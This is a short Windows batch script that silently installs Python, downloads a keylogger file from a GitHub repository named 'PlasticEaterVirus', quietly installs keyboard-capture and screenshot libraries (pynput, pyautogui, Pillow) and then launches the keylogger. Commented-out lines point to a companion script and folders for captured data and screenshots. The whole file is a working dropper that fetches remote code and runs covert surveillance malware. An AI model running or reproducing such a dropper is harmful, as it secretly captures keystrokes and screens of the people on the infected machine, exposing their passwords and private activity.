@ECHO OFF
cd C:\PlasticEater
curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
pythonInstaller.exe /quiet
@REM curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.py -L -O -s
curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/KeyLogger.pyw -L -O -s
@REM TIMEOUT /T 5 /nobreak
py -m pip install --upgrade pynput --quiet
py -m pip install --upgrade pyautogui --quiet
py -m pip install --upgrade Pillow --quiet
@REM py -m pip install --upgrade pynput
@REM py -m pip install --upgrade pyautogui
@REM py -m pip install --upgrade Pillow
@REM mkdir data
@REM mkdir screenshots
@REM py script.py
py KeyLogger/KeyLogger.pyw
